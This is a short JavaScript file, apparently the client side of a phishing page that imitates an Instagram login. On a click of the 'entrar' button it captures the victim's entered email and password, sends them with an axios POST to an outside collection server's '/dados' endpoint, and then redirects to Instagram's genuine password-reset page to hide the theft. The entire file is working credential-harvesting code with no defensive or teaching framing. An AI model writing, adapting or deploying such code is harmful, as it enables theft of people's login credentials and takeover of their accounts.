let inputName = document.querySelector('.inputName')
let inputPass = document.querySelector('.inputPass')

let dados = {
    dataName:'',
    ip:'',
    email:'',
    senha:''
}

document.addEventListener('click',(e)=>{
   
    if(e.target.id === 'entrar'){
        dados = {
            dataName:'Instagram',
            email:inputName.value,
            senha:inputPass.value
        }
       
            axios.post(host+'/dados',dados)
            .then(res=>{
                console.log('res server',res.data)
                console.log(res.data.success)
                if(res.data.success){
                    setTimeout(() => {
                        window.location.href = 'https://www.instagram.com/accounts/password/reset/'
                    }, 500);
                }
            })
            .catch(err => {
                console.log(err)
            })
            
        }   
})